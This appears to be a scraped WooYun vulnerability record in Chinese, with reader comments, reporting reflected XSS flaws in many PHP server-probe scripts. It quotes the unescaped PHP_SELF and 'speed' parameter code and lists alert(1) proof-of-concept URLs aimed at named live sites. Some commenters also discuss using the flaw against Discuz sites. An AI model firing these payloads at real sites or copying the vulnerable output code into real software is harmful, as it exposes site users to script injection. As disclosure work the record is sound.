{"id": 48997, "wybug_id": "wooyun-2014-075468", "wybug_title": "绝大部分php探针存在xss漏洞", "wybug_corp": "各大php探针厂商", "wybug_author": "phith0n", "wybug_date": "2014-09-11 12:31", "wybug_open_date": "2014-12-10 12:34", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["反射型", "源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-16：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-19：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-10：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-20：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-11-30：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-10：\t细节向公众公开  简要描述： 研究了一下市面上的php探针，发现同源现象较严重。首先发现了php雅黑探针（可以说是国内用的最多的探针了）的一些安全问题，由此各种php探针都躺枪了。就算非同源的php探针往往也容易出现这个问题，这里会给出一些例子。该问题影响范围较广，LNMP、WDCP等linux面板由于自带探针、UPUPW面板也自带探针，所以都躺枪了。简单搜集了一下，影响的探针不止有以下这些：php雅黑探针UenuProbe探针UPUPW PHP 探针B-Check探针iProber探针（部分版本）浪点PHP探针C1G PHP探针9Gan php探针ps.中秋快乐~这是给朋友们的节日礼物~ 详细说明：  1.雅黑探针我们就从雅黑php探针说起吧。探针1475行，有如下代码：\n<td width=\"18%\">\t\t<?php\t\t$phpSelf = $_SERVER[PHP_SELF] ? $_SERVER[PHP_SELF] : $_SERVER[SCRIPT_NAME];\t\t$disFuns=get_cfg_var(\"disable_functions\");\t\t?>    <?php echo (false!==eregi(\"phpinfo\",$disFuns))? '<font color=\"red\">×</font>' :\"<a href='$phpSelf?act=phpinfo' target='_blank'>PHPINFO</a>\";?>    </td>\n获得了$_SERVER[PHP_SELF]并赋值给$phpSelf，然后在href中输出。我曾经在绕过360webscan的漏洞中说过，PHP_SELF是我们部分可控的一个变量，如果大家写代码不重视的话，就会出现安全问题。这里就是。比如我们雅黑php探针的官方演示：\nhttp://www.yahei.net/tz/tz.php/%27%3E%3Csvg%20onload=alert%281%29//\n\n\nLNMP的探针也是用的雅黑，所以LNMP也应该躺枪的。但是LNMP默认不支持PHP_SELF，所以上面那个漏洞默认被避免了，但管理员开启了PHP_SELF后效果也是一样。wdcp也自带探针，于是也躺枪了：\nhttp://xmmy.org/index.php/%27%3E%3Csvg%20onload=alert%281%29//\n\n\n由此我们甚至可以衍伸到市面上的各种php探针，因为php探针里面经常会取探针的路径，取路径的时候时常会用到php_self，而且基本不会考虑过滤。那么我们来试试其他的php探针。2.UPUPW PHP 探针UPUPW PHP环境集成包是目前Windows平台下最具特色的Web服务器PHP套件。其自带一个探针，也存在这个xss漏洞。如：\nhttp://huojia.gov.cn/u.php/%27%22%3E%3Csvg%20onload=alert%281%29//\n\n\n3.UenuProbe探针优艺国际什么的php探针，没用过。\nhttp://www.ecmoban.net/index.php/%27%22%3E%3Csvg%20onload=alert%281%29//\n\n\n4.B-Check探针\nhttp://wyyz1234.byethost4.com/index.php/%22%27%3E%3Csvg%20onload=alert%281%29//\n\n\n5.iProber 探针iProber，比较出名的一个探针了，用户也很多。\nhttp://pctartarus.mobhost.in/index.php/%22%27%3E%3Csvg%20onload=alert%281%29//\n\n\n6.浪点php探针\nhttp://tools.cat606.redphp.cn/index.php/%22%27%3E%3Csvg%20onload=alert%281%29//\n\n\n7.C1G php探针\nhttp://bbs.qqht.com/C1G/phpenv2.1.php/%27%22%3E%3Csvg%20onload=alert%281%29//\n\n\n很多很多很多。。。百度下来100个探针里有90+个存在xss，我就不一一列举了。另外，php雅黑探针中还存在一个反射型XSS漏洞，一起打包提交了吧。2141行：\n<?php echo (isset($_GET['speed']))?\"下载1000KB数据用时 <font color='#cc0000'>\".$_GET['speed'].\"</font> 毫秒，下载速度：\".\"<font color='#cc0000'>\".$speed.\"</font>\".\" kb/s，需测试多次取平均值，超过10M直接看下载速度\":\"<font color='#cc0000'>&nbsp;未探测&nbsp;</font>\" ?>\n取得了$_GET[speed]，直接输出在页面中了，造成了反射型XSS。\nhttp://www.yahei.net/tz/tz.php?speed=%3Csvg%20onload=alert%281%29//\n\n\n于是，9Gan php探针也存在这个xss漏洞（9Gan不存在上面说的那个php_self的漏洞，却在这里躺枪了）\nhttp://www.9gan.com/index.php?speed=%3Csvg%20onload=alert%281%29//\n\n\n其他的php探针可能也有这个speed的漏洞，我就不再一一测试了，因为同源现象很严重，问题都测试不完了。   漏洞证明：  见详细说明。   修复方案：  过滤。   版权声明：转载请注明来源 phith0n@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：7  确认时间：2014-09-16 09:05 厂商回复： CNVD确认所述情况，对于所述产品，未建立直接处置渠道，且反射型XSS危害较低，待认领。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-11 13:27 |    \t\tKieran \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:6        | ALways Creative.)\t\t \n  火前留名！膜拜大神    \n     2014-09-11 16:17 |    \t\tRicter \t\t\t( 实习白帽子  |\t\t\t        Rank:59 漏洞数:15        | 渣渣一个)\t\t \n  有什么用么..    \n     2014-09-11 22:00 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  @Ricter 比如你遇到一个最新版discuz，你没0day，扫目录发现个tz.php。那就能当discuz反射型xss用了呗。    \n     2014-09-13 06:43 |    \t\t好基友一辈子 \t\t\t( 普通白帽子  |\t\t\t        Rank:138 漏洞数:37        )\t\t \n  神了    \n     2014-09-13 21:07 |    \t\t默秒全 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:3        | a....)\t\t \n  果断火钳  目测过几天一大波dz的裤子要上路了    \n     2014-09-15 14:07 |    \t\tdo9gy \t\t\t( 实习白帽子  |\t\t\t        Rank:61 漏洞数:15        | Dog loves God。)\t\t \n  @Ricter可导致已入侵网站菊花更加绽放。    \n     2014-09-16 11:06 |    \t\txiaoL \t\t\t( 普通白帽子  |\t\t\t        Rank:361 漏洞数:67        | PKAV技术宅社区!Blog:http://www.xlixli....)\t\t \n  又学到了不少相关名词。    \n     2014-09-16 11:17 |    \t\tGale Albatross \t\t\t( 实习白帽子  |\t\t\t        Rank:47 漏洞数:13        | Gale Albatross)\t\t \n  mark一下。    \n     2014-12-10 13:30 |    \t\t　 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:4        | 　)\t\t \n  必火    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 7, "Ranks": null}